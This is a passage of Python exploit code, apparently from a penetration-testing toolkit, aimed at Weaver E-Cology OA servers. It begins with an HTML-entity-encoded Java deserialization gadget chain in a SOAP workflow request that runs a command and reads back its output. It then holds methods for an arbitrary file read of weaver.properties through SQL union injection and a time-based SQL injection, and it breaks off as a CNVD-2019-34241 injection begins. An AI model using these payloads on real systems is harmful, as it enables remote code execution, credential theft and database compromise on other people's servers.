&#36;&#97;&#50;&#36;&#68;&#36;&#100;&#55;&#82;&#36;&#98;&#49;&#36;&#97;&#99;&#36;&#97;&#51;&#54;&#106;&#71;&#36;&#56;&#97;&#118;&#54;&#54;&#36;&#101;&#48;&#54;&#36;&#57;&#97;&#36;&#102;&#57;&#119;&#36;&#100;&#50;&#36;&#97;&#99;&#36;&#98;&#102;&#36;&#57;&#98;&#74;&#36;&#101;&#57;&#36;&#81;&#113;&#36;&#80;&#36;&#84;&#36;&#101;&#97;&#36;&#118;&#36;&#103;&#36;&#101;&#55;&#36;&#97;&#102;&#36;&#112;&#36;&#99;&#97;&#36;&#89;&#122;&#36;&#57;&#56;&#36;&#56;&#56;&#36;&#99;&#100;&#76;&#69;&#36;&#95;&#36;&#76;&#36;&#101;&#50;&#36;&#115;&#36;&#87;&#70;&#36;&#108;&#36;&#98;&#98;&#36;&#67;&#36;&#53;&#98;&#36;&#100;&#57;&#122;&#36;&#100;&#99;&#76;&#109;&#36;&#98;&#97;&#36;&#57;&#100;&#36;&#114;&#36;&#98;&#49;&#36;&#56;&#51;&#36;&#101;&#100;&#71;&#36;&#57;&#99;&#36;&#51;&#100;&#68;&#36;&#99;&#102;&#67;&#72;&#36;&#98;&#48;&#81;&#36;&#101;&#99;&#98;&#36;&#99;&#55;&#36;&#98;&#48;&#36;&#57;&#98;&#36;&#51;&#100;&#36;&#56;&#98;&#52;&#89;&#106;&#36;&#98;&#50;&#36;&#101;&#55;&#36;&#100;&#49;&#36;&#99;&#101;&#78;&#36;&#111;&#75;&#36;&#100;&#54;&#102;&#36;&#100;&#56;&#36;&#56;&#98;&#36;&#100;&#56;&#36;&#101;&#51;&#36;&#98;&#54;&#36;&#101;&#102;&#36;&#56;&#51;&#36;&#97;&#56;&#36;&#89;&#36;&#99;&#55;&#36;&#79;&#36;&#100;&#101;&#36;&#79;&#36;&#51;&#98;&#36;&#69;&#36;&#100;&#99;&#36;&#111;&#36;&#109;&#36;&#115;&#36;&#54;&#48;&#36;&#97;&#55;&#36;&#102;&#98;&#36;&#100;&#50;&#80;&#120;&#36;&#97;&#49;&#36;&#51;&#97;&#111;&#36;&#109;&#36;&#100;&#53;&#84;&#36;&#102;&#97;&#79;&#36;&#97;&#50;&#36;&#102;&#97;&#36;&#53;&#99;&#98;&#36;&#36;&#36;&#56;&#55;&#36;&#55;&#101;&#36;&#102;&#53;&#66;&#36;&#55;&#102;&#52;&#36;&#100;&#51;&#36;&#51;&#97;&#78;&#67;&#36;&#99;&#56;&#36;&#55;&#102;&#36;&#107;&#36;&#116;&#36;&#56;&#49;&#36;&#87;&#36;&#101;&#97;&#36;&#102;&#52;&#36;&#55;&#102;&#36;&#56;&#51;&#36;&#56;&#100;&#36;&#99;&#51;&#36;&#99;&#98;&#36;&#51;&#98;&#36;&#56;&#101;&#36;&#101;&#102;&#36;&#102;&#56;&#36;&#101;&#53;&#36;&#87;&#119;&#36;&#56;&#55;&#36;&#97;&#48;&#36;&#102;&#49;&#95;&#36;&#104;&#36;&#56;&#53;&#36;&#102;&#55;&#36;&#97;&#101;&#56;&#36;&#83;&#36;&#65;&#36;&#65;&#10;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#110;&#97;&#109;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#114;&#101;&#110;&#116;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#50;&#99;&#101;&#114;&#116;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#104;&#97;&#115;&#104;&#116;&#97;&#98;&#108;&#101;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#32;&#100;&#101;&#102;&#105;&#110;&#101;&#100;&#45;&#105;&#110;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#108;&#97;&#110;&#103;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#108;&#111;&#97;&#100;&#101;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#46;&#46;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#114;&#105;&#110;&#99;&#105;&#112;&#97;&#108;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#107;&#101;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#107;&#101;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#10;&#60;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#34;&#99;&#117;&#115;&#116;&#111;&#109;&#34;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#115;&#101;&#116;&#34;&#62;&#60;&#47;&#99;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#117;&#116;&#101;&#120;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#34;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#34;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#62;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#110;&#97;&#116;&#105;&#118;&#101;&#76;&#105;&#98;&#114;&#97;&#114;&#105;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#97;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#76;&#111;&#99;&#107;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#120;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#115;&#117;&#110;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#83;&#121;&#110;&#116;&#104;&#101;&#116;&#105;&#99;&#82;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#116;&#104;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#46;&#60;&#47;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#95;&#95;&#108;&#111;&#97;&#100;&#101;&#100;&#67;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#101;&#114;&#84;&#111;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#116;&#121;&#112;&#101;&#62;&#75;&#69;&#89;&#83;&#60;&#47;&#116;&#121;&#112;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#110;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#66;&#121;&#116;&#101;&#65;&#114;&#114;&#97;&#121;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#98;&#117;&#102;&#62;&#60;&#47;&#98;&#117;&#102;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#111;&#115;&#62;&#48;&#60;&#47;&#112;&#111;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#97;&#114;&#107;&#62;&#48;&#60;&#47;&#109;&#97;&#114;&#107;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#99;&#111;&#117;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#116;&#114;&#97;&#110;&#115;&#102;&#101;&#114;&#70;&#108;&#97;&#118;&#111;&#114;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#48;&#60;&#47;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#39;&#47;&#62;&#10;&#32;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#10;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;</web:string>
                                <web:string>2</web:string>
                            </web:doCreateWorkflowRequest>
                        </soapenv:Body>
        </soapenv:Envelope>'''
        headers = {
        "WWW-Authenticate": base64.b64encode(self.cmd.encode('utf-8'))[::-1].decode('utf-8'),
        "Content-Type": "text/xml;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        'Cookie': 'JSESSIONID=abcyPRTxFtGCX_WSXoKxx;ecology_JSessionid=abcyPRTxFtGCX_WSXoKxx;testBanCookie=test',
        "Connection": "close"
        }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    )
                if '&error=' in r.text and 'Auth=' in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    )
                if '&error=' in r.text and 'Auth=' in r.text:
                    result = r.text.split('&error=')[0].replace('Auth=', '')
                    import urllib
                    content = urllib.parse.unquote(result)
                    strs = content[::-1]
                    res = base64.b64decode(strs).decode('GBK')
                    print(res)
        except Exception as error:
            return output.error_output(str(error))

    def E_Weaver_any_file_read_exp(self):
        appName = 'oa_weaver'
        pocname = 'E_Weaver_any_file_read_exp'
        path = r"""/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"""
        method = 'get'
        desc = '[file reading] app="泛微-E-Weaver"'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    )
                if "ecology.user" in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_Weaver_sql_injection_exp(self):
        appName = 'oa_weaver'
        pocname = 'E_Weaver_sql_injection_exp'
        method = 'get'
        desc = '[sql injection] app="泛微-E-Weaver"'
        cmd = "WAITFOR DELAY '00:00:03'"
        path = "/Api/portal/elementEcodeAddon/getSqlData?sql={}".format(cmd)
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    )
                if '"api_status":true' in r.text and r.status_code == 200:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_Weaver_WorkflowCenterTreeData_Sql(self):
        appName = 'oa_weaver'
        pocname = 'E_Weaver_WorkflowCenterTreeData_Sql'
        method = 'post'
        desc = '[sql injection] 泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241 app="泛微-协同办公OA"'
        path = '/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
